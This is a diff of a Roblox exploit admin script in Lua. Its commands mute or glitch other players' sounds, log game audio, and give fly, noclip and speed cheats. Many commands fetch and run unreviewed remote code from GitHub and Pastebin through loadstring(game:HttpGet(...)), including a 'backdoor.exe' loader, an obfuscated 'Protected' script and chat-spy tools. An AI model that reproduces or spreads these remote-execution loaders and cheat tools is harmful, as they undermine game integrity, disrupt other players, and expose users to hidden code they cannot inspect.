-					if game:GetService("SoundService").RespectFilteringEnabled == true then
-						print("Muted Radio as Client")
-					else
-						print("Muted Radio as FE")
-						if Username == "all" or Username == "others" then
-							local players = game:GetService("Players"):GetPlayers()
-							for _, player in ipairs(players) do
-								for _, object in ipairs(player.Character:GetDescendants()) do
-									if object:IsA("Sound") and object.Playing then
-										object:Stop()
-									end
-								end
-								local backpack = player:FindFirstChildOfClass("Backpack")
-								if backpack then
-									for _, object in ipairs(backpack:GetDescendants()) do
-										if object:IsA("Sound") and object.Playing then
-											object:Stop()
-										end
-									end
-								end
-							end			
-						else
-							local players = getPlr(Username)
-							if players ~= nil then
-								for i, x in next, players.Character:GetDescendants() do
-									if x:IsA("Sound") and x.Playing == true then
-										x.Playing = false
-									end
-								end
-								for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
-									if x:IsA("Sound") and x.Playing == true then
-										x.Playing = false
-									end
-								end
-							end 
-						end
-					end
+					loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
 				end)
-				local plrs = game:GetService("Players"):FindFirstChild(args[2])
-				if args[2] ~= plrs.Name then
-					output.Text = "Error: Player not found."
-					task.wait(4)
-					output.Text = ""
-				elseif args[2] == plrs.Name then
-					output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
-					task.wait(4)
-					output.Text = ""
-				end
-			elseif args[1] == prefix.."loopmuteradio" then
-				task.spawn(function()
-					Username = args[2]
-					if Username == "all" or Username == "others" then
-						Loopmute = true
-						repeat task.wait()
-							local players = game:GetService("Players"):GetPlayers()
-							for _, player in ipairs(players) do
-								for _, object in ipairs(player.Character:GetDescendants()) do
-									if object:IsA("Sound") and object.Playing then
-										object:Stop()
-									end
-								end
-								local backpack = player:FindFirstChildOfClass("Backpack")
-								if backpack then
-									for _, object in ipairs(backpack:GetDescendants()) do
-										if object:IsA("Sound") and object.Playing then
-											object:Stop()
-										end
-									end
-								end
-							end	
-						until Loopmute == false
-					else
-						Loopmute = true
-						local players = getPlr(Username)
-						repeat task.wait()
+			end
+		end
 	
-							if players ~= nil then
-								for i, x in next, players.Character:GetDescendants() do
-									if x:IsA("Sound") and x.Playing == true then
-										x.Playing = false
-									end
-								end
-								for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
-									if x:IsA("Sound") and x.Playing == true then
-										x.Playing = false
-									end
-								end
-							end 
-						until Loopmute == false
-						if game:GetService("SoundService").RespectFilteringEnabled == true then
-							print("Boombox loop muted as Client")
-						else
-							if game:GetService("SoundService").RespectFilteringEnabled == false then
-								print("Boombox loop muted as FE")
-							end
-						end
-					end
-				end)
-				local plrs = game:GetService("Players"):FindFirstChild(args[2])
-				if args[2] ~= plrs.Name then
-					output.Text = "Error: Player not found."
-					task.wait(4)
-					output.Text = ""
-				elseif args[2] == plrs.Name then
-					output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
-					task.wait(4)
-					output.Text = ""
-				end
-			elseif args[1] == prefix.."unloopmuteradio" then
-				Loopmute = false
-				print("Muted Boomboxes are now able to be used.")
-			elseif args[1] == prefix.."glitchradio" then
-				task.spawn(function()
-					Username = args[2]
-					Loopglitch = true
-					local players = getPlr(Username)
-					if players ~= nil then
-						for i, x in next, players.Character:GetDescendants() do
-							if x:IsA("Sound") and x.Playing == true then
-								x.Playing = true
-							end
-						end
-						for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
-							if x:IsA("Sound") and x.Playing == true then
-								x.Playing = true
-							end
-						end
-					end 
-					repeat wait()
-						for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
-							if x:IsA("Sound") and x.Playing == false then
-								x.Playing = true
-							end
-						end
-						for i, x in next, players.Character:GetDescendants() do
-							if x:IsA("Sound") and x.Playing == false then
-								x.Playing = true
-							end
-						end
-						task.wait(0.2)
-						for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
-							if x:IsA("Sound") and x.Playing == true then
-								x.Playing = false
-							end
-						end
-						for i, x in next, players.Character:GetDescendants() do
-							if x:IsA("Sound") and x.Playing == true then
-								x.Playing = false
-							end
-						end
-						task.wait(0.2)
-					until Loopglitch == false
-					if game:GetService("SoundService").RespectFilteringEnabled == true then
-						print("Boombox Glitched as Client")
-					else
-						if game:GetService("SoundService").RespectFilteringEnabled == false then
-							print("Boombox Glitched as FE")
-						end
-					end
-				end)
-				local plrs = game:GetService("Players"):FindFirstChild(args[2])
-				if args[2] ~= plrs.Name then
-					output.Text = "Error: Player not found."
-					task.wait(4)
-					output.Text = ""
-				elseif args[2] == plrs.Name then
-					output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
-					task.wait(4)
-					output.Text = ""
-				end
-			elseif args[1] == prefix.."audiologs" then
-				task.spawn(function()
-					aa = game:GetObjects("rbxassetid://01997056190")[1]
-					aa.Parent = game.CoreGui
-					task.wait(0.2)
-					GUI = aa.PopupFrame.PopupFrame
-					pos = 0
-	
-					ignore = {
-						"rbxasset://sounds/action_get_up.mp3",
-						"rbxasset://sounds/uuhhh.mp3",
-						"rbxasset://sounds/action_falling.mp3",
-						"rbxasset://sounds/action_jump.mp3",
-						"rbxasset://sounds/action_jump_land.mp3",
-						"rbxasset://sounds/impact_water.mp3",
-						"rbxasset://sounds/action_swim.mp3",
-						"rbxasset://sounds/action_footsteps_plastic.mp3"
-					}
-	
-					GUI.Close.MouseButton1Click:connect(function()
-						GUI:TweenSize(UDim2.new(0, 360, 0, 0),"Out","Quad",0.5,true) task.wait(0.6)
-						GUI.Parent:TweenSize(UDim2.new(0, 0, 0, 20),"Out","Quad",0.5,true) task.wait(0.6)
-						aa:Destroy()
-					end)
-	
-					local min = false
-					GUI.Minimize.MouseButton1Click:connect(function()
-						if min == false then
-							GUI:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) min = true
-						else
-							GUI:TweenSize(UDim2.new(0, 360, 0, 260),"Out","Quad",0.5,true) min = false
-						end
-					end)
-	
-					function printTable(tbl)
-						if type(tbl) ~= 'table' then return nil end
-						local depthCount = -15
-	
-						local function run(val, inPrefix)
-							depthCount = depthCount + 15
-							-- if inPrefix then print(string.rep(' ', depthCount) .. '{') end
-							for i,v in pairs(val) do
-								if type(v) == 'table' then
-									-- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {')
-									GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {'
-									run(v, false)
-									task.wait()
-								else
-									-- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v))
-									GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v)
-									task.wait()
-								end
-							end
-							-- print(string.rep(' ', depthCount) .. '}')
-							depthCount = depthCount - 15
-						end
-						run(tbl, true)
-					end
-	
-					function refreshlist()
-						pos = 0
-						GUI.Logs.CanvasSize = UDim2.new(0,0,0,0)
-						for i,v in pairs(GUI.Logs:GetChildren()) do
-							v.Position = UDim2.new(0,0,0, pos)
-							GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
-							pos = pos+20
-						end
-					end
-	
-					function FindTable(Table, Name)
-						for i,v in pairs(Table) do
-							if v == Name then
-								return true
-							end end
-						return false
-					end
-	
-					function writefileExploit()
-						if writefile then
-							return true
-						end
-					end
-	
-					writeaudio = {}
-					running = false
-					GUI.SS.MouseButton1Click:connect(function()
-						if writefileExploit() then
-							if running == false then
-								GUI.Load.Visible = true running = true
-								GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) task.wait(0.3)
-								for _, child in pairs(GUI.Logs:GetChildren()) do
-									if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
-										if bttn.BackgroundTransparency == 0 then
-											writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
-										end
-									end
-								end
-								GUI.Store.Visible = true
-								printTable(writeaudio)
-								task.wait(0.2)
-								local filename = 0
-								local function write()
-									local file
-									pcall(function() file = readfile("Audios"..filename..".txt") end)
-									if file then
-										filename = filename+1
-										write()
-									else
-										local text = tostring(GUI.Store.Text)
-										text = text:gsub('\n', '\r\n')
-										writefile("Audios"..filename..".txt", text)
-									end
-								end
-								write()
-								for rep = 1,10 do
-									GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
-									task.wait(0.05)
-								end
-								GUI.Load.Visible = false
-								GUI.Load.BackgroundTransparency = 0
-								GUI.Load.Size = UDim2.new(0, 0, 0, 20)
-								running = false
-								GUI.Store.Visible = false
-								GUI.Store.Text = ''
-								writeaudio = {}
-								game:FindService('StarterGui'):SetCore('SendNotification', {
-									Title = 'Audio Logger',
-									Text = 'Saved audios\n(Audios'..filename..'.txt)',
-									Icon = 'http://www.roblox.com/asset/?id=176572847',
-									Duration = 5,
-								})
-							end
-						else
-							game:FindService('StarterGui'):SetCore('SendNotification', {
-								Title = 'Audio Logger',
-								Text = 'Exploit cannot writefile :(',
-								Icon = 'http://www.roblox.com/asset/?id=176572847',
-								Duration = 5,
-							})
-						end
-					end)
-	
-					GUI.SA.MouseButton1Click:connect(function()
-						if writefileExploit() then
-							if running == false then
-								GUI.Load.Visible = true running = true
-								GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) task.wait(0.3)
-								for _, child in pairs(GUI.Logs:GetChildren()) do
-									writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
-								end
-								GUI.Store.Visible = true
-								printTable(writeaudio)
-								task.wait(0.2)
-								local filename = 0
-								local function write()
-									local file
-									pcall(function() file = readfile("Audios"..filename..".txt") end)
-									if file then
-										filename = filename+1
-										write()
-									else
-										local text = tostring(GUI.Store.Text)
-										text = text:gsub('\n', '\r\n')
-										writefile("Audios"..filename..".txt", text)
-									end
-								end
-								write()
-								for rep = 1,10 do
-									GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
-									task.wait(0.05)
-								end
-								GUI.Load.Visible = false
-								GUI.Load.BackgroundTransparency = 0
-								GUI.Load.Size = UDim2.new(0, 0, 0, 20)
-								running = false
-								GUI.Store.Visible = false
-								GUI.Store.Text = ''
-								writeaudio = {}
-								game:FindService('StarterGui'):SetCore('SendNotification', {
-									Title = 'Audio Logger',
-									Text = 'Saved audios\n(Audios'..filename..'.txt)',
-									Icon = 'http://www.roblox.com/asset/?id=176572847',
-									Duration = 5,
-								})
-							end
-						else
-							game:FindService('StarterGui'):SetCore('SendNotification', {
-								Title = 'Audio Logger',
-								Text = 'Exploit cannot writefile :(',
-								Icon = 'http://www.roblox.com/asset/?id=176572847',
-								Duration = 5,
-							})
-						end
-					end)
-	
-					selectedaudio = nil
-					function getaudio(place)
-						if running == false then
-							GUI.Load.Visible = true running = true
-							GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) task.wait(0.3)
-							for _, child in pairs(place:GetDescendants()) do
-								spawn(function()
-									if child:IsA("Sound") and not GUI.Logs:FindFirstChild(child.SoundId) and not FindTable(ignore,child.SoundId) then
-										local id = string.match(child.SoundId, "rbxasset://sounds.+") or string.match(child.SoundId, "&hash=.+") or string.match(child.SoundId, "%d+")
-										if id ~= nil then		
-											local newsound = GUI.Audio:Clone()
-											if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
-												id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
-												newsound.ImageButton.Image = 'rbxassetid://1453863294'
-											end
-											newsound.Parent = GUI.Logs
-											newsound.Name = child.SoundId
-											newsound.Visible = true
-											newsound.Position = UDim2.new(0,0,0, pos)
-											GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
-											pos = pos+20
-											local function findname()
-												Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
-											end
-											local audioname = 'error'
-											local success, message = pcall(findname)
-											if success then
-												newsound.TextLabel.Text = Asset.Name
-												audioname = Asset.Name
-											else
-												newsound.TextLabel.Text = child.Name
-												audioname = child.Name
-											end
-											local data = Instance.new('StringValue') data.Parent = newsound data.Value = child.SoundId data.Name = 'ID'
-											local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
-											local soundselected = false
-											newsound.ImageButton.MouseButton1Click:Connect(function()
-												if GUI.Info.Visible ~= true then
-													if soundselected == false then soundselected = true
-														newsound.ImageButton.BackgroundTransparency = 0
-													else soundselected = false
-														newsound.ImageButton.BackgroundTransparency = 1
-													end
-												end
-											end)
-											newsound.Click.MouseButton1Click:Connect(function()
-												if GUI.Info.Visible ~= true then
-													GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. child.SoundId .. "\n\nWorkspace Name: " .. child.Name
-													selectedaudio = child.SoundId
-													GUI.Info.Visible = true
-												end
-											end)
-										end
-									end
-								end)
-							end
-						end
-						for rep = 1,10 do
-							GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
-							task.wait(0.05)
-						end
-						GUI.Load.Visible = false
-						GUI.Load.BackgroundTransparency = 0
-						GUI.Load.Size = UDim2.new(0, 0, 0, 20)
-						running = false
-					end
-	
-					GUI.All.MouseButton1Click:connect(function() getaudio(game)end)
-					GUI.Workspace.MouseButton1Click:connect(function() getaudio(workspace)end)
-					GUI.Lighting.MouseButton1Click:connect(function() getaudio(game:GetService('Lighting'))end)
-					GUI.SoundS.MouseButton1Click:connect(function() getaudio(game:GetService('SoundService'))end)
-					GUI.Clr.MouseButton1Click:connect(function()
-						for _, child in pairs(GUI.Logs:GetChildren()) do
-							if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
-								if bttn.BackgroundTransparency == 1 then
-									bttn.Parent:Destroy()
-									refreshlist()
-								end
-							end
-						end
-					end)
-					GUI.ClrS.MouseButton1Click:connect(function()
-						for _, child in pairs(GUI.Logs:GetChildren()) do
-							if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
-								if bttn.BackgroundTransparency == 0 then
-									bttn.Parent:Destroy()
-									refreshlist()
-								end
-							end
-						end
-					end)
-					autoscan = false
-					GUI.AutoScan.MouseButton1Click:connect(function()
-						if autoscan == false then autoscan = true
-							GUI.AutoScan.BackgroundTransparency = 0.5
-							game:FindService('StarterGui'):SetCore('SendNotification', {
-								Title = 'Audio Logger',
-								Text = 'Auto Scan ENABLED',
-								Icon = 'http://www.roblox.com/asset/?id=176572847',
-								Duration = 5,
-							})
-						else autoscan = false
-							GUI.AutoScan.BackgroundTransparency = 0
-							game:FindService('StarterGui'):SetCore('SendNotification', {
-								Title = 'Audio Logger',
-								Text = 'Auto Scan DISABLED',
-								Icon = 'http://www.roblox.com/asset/?id=176572847',
-								Duration = 5,
-							})
-						end
-					end)
-	
-					game.DescendantAdded:connect(function(added)
-						task.wait()
-						if autoscan == true and added:IsA('Sound') and not GUI.Logs:FindFirstChild(added.SoundId) and not FindTable(ignore,added.SoundId) then
-							local id = string.match(added.SoundId, "rbxasset://sounds.+") or string.match(added.SoundId, "&hash=.+") or string.match(added.SoundId, "%d+")
-							if id ~= nil then		
-								local newsound = GUI.Audio:Clone()
-								if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
-									id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
-									newsound.ImageButton.Image = 'rbxassetid://1453863294'
-								end
-								local scrolldown = false
-								newsound.Parent = GUI.Logs
-								newsound.Name = added.SoundId
-								newsound.Visible = true
-								newsound.Position = UDim2.new(0,0,0, pos)
-								if GUI.Logs.CanvasPosition.Y == GUI.Logs.CanvasSize.Y.Offset - 230 then
-									scrolldown = true
-								end
-								GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
-								pos = pos+20
-								local function findname()
-									Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
-								end
-								local audioname = 'error'
-								local success, message = pcall(findname)
-								if success then
-									newsound.TextLabel.Text = Asset.Name
-									audioname = Asset.Name
-								else 
-									newsound.TextLabel.Text = added.Name
-									audioname = added.Name
-								end
-								local data = Instance.new('StringValue') data.Parent = newsound data.Value = added.SoundId data.Name = 'ID'
-								local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
-								local soundselected = false
-								newsound.ImageButton.MouseButton1Click:Connect(function()
-									if GUI.Info.Visible ~= true then
-										if soundselected == false then soundselected = true
-											newsound.ImageButton.BackgroundTransparency = 0
-										else soundselected = false
-											newsound.ImageButton.BackgroundTransparency = 1
-										end
-									end
-								end)
-								newsound.Click.MouseButton1Click:Connect(function()
-									if GUI.Info.Visible ~= true then
-										GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. added.SoundId .. "\n\nWorkspace Name: " .. added.Name
-										selectedaudio = added.SoundId
-										GUI.Info.Visible = true
-									end
-								end)
-								--230'
-								if scrolldown == true then
-									GUI.Logs.CanvasPosition = Vector2.new(0, 9999999999999999999999999999999999999999999, 0, 0)
-								end
-							end
-						end
-					end)
-	
-					GUI.Info.Copy.MouseButton1Click:Connect(function()
-						if pcall(function() Synapse:Copy(selectedaudio) end) then	
-						else
-							local clip = setclipboard or Clipboard.set
-							clip(selectedaudio)
-						end
-						game:FindService('StarterGui'):SetCore('SendNotification', {
-							Title = 'Audio Logger',
-							Text = 'Copied to clipboard',
-							Icon = 'http://www.roblox.com/asset/?id=176572847',
-							Duration = 5,
-						})
-					end)
-	
-					GUI.Info.Close.MouseButton1Click:Connect(function()
-						GUI.Info.Visible = false
-						for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
-							if sound.Name == 'SampleSound' then
-								sound:Destroy()
-							end
-						end
-						GUI.Info.Listen.Text = 'Listen'
-					end)
-	
-					GUI.Info.Listen.MouseButton1Click:Connect(function()
-						if GUI.Info.Listen.Text == 'Listen' then
-							local samplesound = Instance.new('Sound') samplesound.Parent = game:GetService('Players').LocalPlayer.PlayerGui
-							samplesound.Looped = true samplesound.SoundId = selectedaudio samplesound:Play() samplesound.Name = 'SampleSound'
-							samplesound.Volume = 5
-							GUI.Info.Listen.Text = 'Stop'
-						else
-							for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
-								if sound.Name == 'SampleSound' then
-									sound:Destroy()
-								end
-							end
-							GUI.Info.Listen.Text = 'Listen'
-						end
-					end)
-	
-					function drag(gui)
-						spawn(function()
-							local UserInputService = game:GetService("UserInputService")
-							local dragging
-							local dragInput
-							local dragStart
-							local startPos
-							local function update(input)
-								local delta = input.Position - dragStart
-								gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), "InOut", "Quart", 0.04, true, nil) 
-							end
-							gui.InputBegan:Connect(function(input)
-								if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-									dragging = true
-									dragStart = input.Position
-									startPos = gui.Position
-									input.Changed:Connect(function()
-										if input.UserInputState == Enum.UserInputState.End then
-											dragging = false
-										end
-									end)
-								end
-							end)
-							gui.InputChanged:Connect(function(input)
-								if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-									dragInput = input
-								end
-							end)
-							UserInputService.InputChanged:Connect(function(input)
-								if input == dragInput and dragging then
-									update(input)
-								end
-							end)
-						end)
-					end
-					drag(aa.PopupFrame)
-				end)
-			elseif args[1] == prefix.."bdexe" then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/k4scripts/backdoor.exe/v8/src/main.lua"))();
-			elseif args[1] == prefix.."frakturess" then
-				loadstring(game:HttpGet(("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/source.lua"),true))()
-			elseif args[1] == prefix.."chatbot" then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/Guerric9018/chatbothub/main/ChatbotHub.lua"))()
-			elseif args[1] == prefix.."antifling" then
-				loadstring(game:HttpGet("https://pastebin.com/raw/mHaznh3T", true))()
-			elseif args[1] == prefix.."fly" then
-				task.spawn(function()
-					pcall(function()
-						game.Players.LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam	
-					end)
-					local SprintSpeed = 30
-					local Speed = 5
-					Toggled = true
-					LastPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-					game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true
-					function KeyHandler(actionName, userInputState)
-						if true and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-							if actionName == "Forward" then
-								Tilt = userInputState == Enum.UserInputState.Begin and -20 or 0
-								Direction = Vector3.new(Direction.x,Direction.y,userInputState == Enum.UserInputState.Begin and -1 or 0)
-							elseif actionName == "Left" then
-								Direction = Vector3.new(userInputState == Enum.UserInputState.Begin and -1 or 0,Direction.y,Direction.z)
-							elseif actionName == "Backward" then
-								Tilt = userInputState == Enum.UserInputState.Begin and 20 or 0
-								Direction = Vector3.new(Direction.x,Direction.y,userInputState == Enum.UserInputState.Begin and 1 or 0)
-							elseif actionName == "Right" then
-								Direction = Vector3.new(userInputState == Enum.UserInputState.Begin and 1 or 0,Direction.y,Direction.z)
-							elseif actionName == "Up" then
-								Direction = Vector3.new(Direction.x,userInputState == Enum.UserInputState.Begin and 1 or 0,Direction.z)
-							elseif actionName == "Down" then
-								Direction = Vector3.new(Direction.x,userInputState == Enum.UserInputState.Begin and -1 or 0,Direction.z)
-							elseif actionName == "Sprint" then
-								Sprinting = userInputState == Enum.UserInputState.Begin
-							end
-						end
-					end
-					game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
-						if gameProcessedEvent then return end
-	
-						if inputObject.KeyCode == Enum.KeyCode.W then
-							KeyHandler("Forward", Enum.UserInputState.Begin, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.A then
-							KeyHandler("Left", Enum.UserInputState.Begin, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.S then
-							KeyHandler("Backward", Enum.UserInputState.Begin, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.D then
-							KeyHandler("Right", Enum.UserInputState.Begin, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.E then	
-							KeyHandler("Up", Enum.UserInputState.Begin, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.Q then
-							KeyHandler("Down", Enum.UserInputState.Begin, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.LeftControl then
-							KeyHandler("Sprint", Enum.UserInputState.Begin, inputObject)
-						end
-	
-					end)
-					game:GetService("UserInputService").InputEnded:connect(function(inputObject, gameProcessedEvent)
-						if gameProcessedEvent then return end
-	
-						if inputObject.KeyCode == Enum.KeyCode.W then
-							KeyHandler("Forward", Enum.UserInputState.End, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.A then
-							KeyHandler("Left", Enum.UserInputState.End, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.S then
-							KeyHandler("Backward", Enum.UserInputState.End, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.D then
-							KeyHandler("Right", Enum.UserInputState.End, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.E then	
-							KeyHandler("Up", Enum.UserInputState.End, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.Q then
-							KeyHandler("Down", Enum.UserInputState.End, inputObject)
-						elseif inputObject.KeyCode == Enum.KeyCode.LeftControl then
-							KeyHandler("Sprint", Enum.UserInputState.End, inputObject)
-						end
-						
-					end)
-					RunService.RenderStepped:Connect(function()
-						if Toggled and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")  then
-							for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-								if v:IsA("BasePart") then
-									v.Velocity = Vector3.new(0,0,0)
-								end
-							end
-							local RootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
-							InterpolatedDir = InterpolatedDir:Lerp((Direction * (Sprinting and SprintSpeed or Speed)),.2)
-							InterpolatedTilt = Lerp(InterpolatedTilt ,Tilt* (Sprinting and 2 or 1),Tilt == 0 and .2 or .1)
-							RootPart.CFrame = RootPart.CFrame:Lerp(CFrame.new(RootPart.Position,RootPart.Position + Mouse.UnitRay.Direction) * CFrame.Angles(0,math.rad(00),0) * CFrame.new(InterpolatedDir)  * CFrame.Angles(math.rad(InterpolatedTilt),0,0),.2)
-						else
-							return
-						end	
-					end)
-				end)
-			elseif args[1] == prefix.."unfly" then
-				task.spawn(function()
-					pcall(function()
-						game.Players.LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Zoom	
-					end)
-					Toggled = false
-					LastPos = nil
-					game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
-				end)
-			elseif args[1] == prefix.."noclip" then
+		for _, name in pairs(allcmds.noclip) do
+			if cmd == prefix..name then
 				task.spawn(function()
 					Clip = false
 					wait(0.1)
@@ -2687,64 +2047,328 @@ local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjh
 					end
 					Noclipping = RunService.Stepped:Connect(NoclipLoop)
 				end)
-			elseif args[1] == prefix.."clip" then
-				if Noclipping then
-					Noclipping:Disconnect()
-					for _, child in pairs(speaker.Character:GetDescendants()) do
-						if child:IsA("BasePart") and child.CanCollide == false and child.Name ~= floatName then
-							child.CanCollide = true
-						end
-					end
-				end
-				Clip = true
-			elseif args[1] == prefix.."speed" then
+			end
+		end
+	
+		for _, name in pairs(allcmds.rejoin) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					if TPWalk == true then
-						TPWalk = false
-						TPWalking = TPWalking:Disconnect()
-					end
-					TPWalk = true
-					Speed = args[2]
-					TPWalking = game:GetService("RunService").Heartbeat:Wait()
-					game:GetService("RunService").Stepped:Connect(function()
-						if TPWalk == true then
-							if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection.Magnitude > 0 then
-								if Speed then
-									game.Players.LocalPlayer.Character:TranslateBy(game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection * Speed * TPWalking * 10)
-								else
-									game.Players.LocalPlayer.Character:TranslateBy(game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection * TPWalking * 10)
-								end
+					game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.shyguy) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/SpiderScriptRBUniversal/refs/heads/main/Protected_Spider.txt"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.spygui) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/uPGrjsd6"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.uncmds) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					cmdlist.Visible = false
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.chatbot) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/Guerric9018/chatbothub/main/ChatbotHub.lua"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.chatspy) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/iMSiUd3k"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.quizgui) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/Damian-11/quizbot/master/quizbot.luau"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.rizzgui) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/OpenSource/main/rizzler.lua",true))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.unspeed) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					TPWalk = false
+					TPWalking = TPWalking:Disconnect()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.chatdraw) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/AKadminlol/Chatdraw/refs/heads/main/Chattdraw"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.doorsgui) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.emotegui) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.graphics) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/Fadify/RO-TX/main/Main.lua"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.antifling) do
